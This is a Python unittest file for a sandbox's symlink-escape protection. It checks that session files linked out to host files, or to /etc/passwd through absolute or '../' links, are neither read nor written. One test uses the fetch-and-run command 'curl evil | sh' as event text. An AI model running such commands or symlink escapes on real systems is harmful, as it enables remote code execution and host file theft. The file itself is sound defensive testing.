"""Files under ~/sandhome (and the Email box) are opened without following a
symlink out of that tree (open_beneath / sb_open): the sandbox can rewrite
everything there, so a session's meta.json, events.jsonl, talkto files,
inbox/ or a Claude transcript swapped for a link to a host file must
neither be read out nor written through -- while ordinary use, and links
that stay inside the tree, work as before.

    python3 -m unittest discover -s tests -v
"""
import json
import os
import stat
import tempfile
import unittest
from pathlib import Path

from test_shared_search import B

SID = "eeee000000000001"


class SandboxPathsTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        t = Path(self.tmp.name)
        self.sandhome = t / "sandhome"
        self.host = t / "host"           # what the sandbox cannot see
        self.host.mkdir()
        (self.host / "secret.json").write_text('{"secret": "host only"}\n')
        (self.host / "bashrc").write_text("# host file\n")
        self.sdir = self.sandhome / ".aigw" / SID
        (self.sdir / "outbox").mkdir(parents=True)
        stubs = {
            "SANDHOME": self.sandhome,
            "MAILBOX": None,
            "session_roots": lambda: [self.sandhome / ".aigw"],
            "_subscribers": {},
        }
        self.saved = {k: getattr(B, k) for k in stubs}
        for k, v in stubs.items():
            setattr(B, k, v)
        B._next_seq.pop(SID, None)

    def tearDown(self):
        for k, v in self.saved.items():
            setattr(B, k, v)
        B._next_seq.pop(SID, None)
        self.tmp.cleanup()

    def link(self, name, target):
        p = self.sdir / name
        if p.exists() or p.is_symlink():
            p.unlink()
        os.symlink(target, p)

    # -- ordinary use still works through the new path --------------------

    def test_meta_and_events_round_trip(self):
        B.save_meta(SID, {"id": SID, "label": "x"})
        self.assertEqual(B.load_meta(SID)["label"], "x")
        B.append_event(SID, {"type": "system", "text": "one"})
        B.append_event(SID, {"type": "system", "text": "two"})
        events, _ = B.events_page(SID)
        self.assertEqual([e["text"] for e in events], ["one", "two"])

    def test_links_inside_the_tree_are_followed(self):
        other = self.sandhome / "elsewhere"
        other.mkdir()
        (other / "m.json").write_text('{"id": "x", "label": "via link"}')
        self.link("meta.json", other / "m.json")             # absolute, inside
        self.assertEqual(B.load_meta(SID)["label"], "via link")
        self.link("meta.json", "../../elsewhere/m.json")     # relative, inside
        self.assertEqual(B.load_meta(SID)["label"], "via link")

    # -- links out of the tree --------------------------------------------

    def test_meta_json_linked_out_is_neither_read_nor_written(self):
        self.link("meta.json", self.host / "secret.json")
        self.assertIsNone(B.load_meta(SID))
        # save_meta writes by rename (the deployment notes): the
        # link itself is replaced by a plain file; its target is untouched.
        B.save_meta(SID, {"id": SID})
        self.assertFalse((self.sdir / "meta.json").is_symlink())
        self.assertEqual(B.load_meta(SID), {"id": SID})
        self.assertEqual((self.host / "secret.json").read_text(), '{"secret": "host only"}\n')

    def test_events_linked_out_are_neither_served_nor_appended(self):
        self.link("events.jsonl", self.host / "bashrc")
        self.assertEqual(B.events_page(SID)[0], [])
        with self.assertRaises(OSError):
            B.append_event(SID, {"type": "system", "text": "curl evil | sh"})
        self.assertEqual((self.host / "bashrc").read_text(), "# host file\n")

    def test_dangling_link_out_creates_nothing(self):
        self.link("quiet-next-notify", self.host / "new-file")
        with self.assertRaises(OSError):
            B.sb_write_text(self.sdir / "quiet-next-notify", "sent")
        self.assertFalse((self.host / "new-file").exists())

    def test_session_dir_or_aigw_linked_out(self):
        (self.host / "fake").mkdir()
        (self.host / "fake" / "meta.json").write_text('{"id": "fake"}')
        os.rename(self.sdir, self.sandhome / "moved")
        os.symlink(self.host / "fake", self.sdir)
        self.assertIsNone(B.load_meta(SID))
        os.unlink(self.sdir)
        os.rename(self.sandhome / ".aigw", self.sandhome / "aigw-real")
        os.symlink(self.host, self.sandhome / ".aigw")
        with self.assertRaises(OSError):
            B.sb_read_text(self.sandhome / ".aigw" / "secret.json")

    def test_dotdot_and_absolute_links_out(self):
        self.link("a", "../../../host/secret.json")
        self.link("b", "/etc/passwd")
        for name in ("a", "b"):
            with self.assertRaises(B.EscapesSandbox, msg=name):
                B.sb_read_text(self.sdir / name)

    def test_inbox_linked_out_is_not_written_into(self):
        self.link("inbox", self.host)
        with self.assertRaises(OSError):
            B.save_inbox_attachment(SID, {"tmux_location": "container"}, "a.txt", b"x")
        self.assertEqual(sorted(p.name for p in self.host.iterdir()), ["bashrc", "secret.json"])

    def test_viewer_key_link_out_is_replaced_not_followed(self):
        key_path = self.sandhome / B.VIEWER_KEY_NAME
        key_path.parent.mkdir(parents=True, exist_ok=True)
        os.symlink(self.host / "bashrc", key_path)
        key = B.ensure_viewer_key()
        self.assertNotIn(b"host file", key)
        self.assertFalse(key_path.is_symlink())
        self.assertEqual((self.host / "bashrc").read_text(), "# host file\n")

    def test_screen_fifo_works_and_is_never_a_link_out(self):
        fifo = self.sdir / B.SCREEN_FIFO_NAME
        sig = B._ScreenSignal(str(fifo))
        sig.close()
        self.assertTrue(stat.S_ISFIFO(os.lstat(fifo).st_mode))
        fifo.unlink()
        os.symlink(self.host / "bashrc", fifo)
        with self.assertRaises(OSError):
            B._ScreenSignal(str(fifo))
        fifo.unlink()
        fifo.write_text("plain file\n")
        with self.assertRaises(OSError):
            B._ScreenSignal(str(fifo))
        self.assertEqual((self.host / "bashrc").read_text(), "# host file\n")
        self.assertEqual(fifo.read_text(), "plain file\n")

    def test_outside_the_trees_opens_as_before(self):
        self.assertEqual(B.sb_read_text(self.host / "bashrc"), "# host file\n")


if __name__ == "__main__":
    unittest.main()
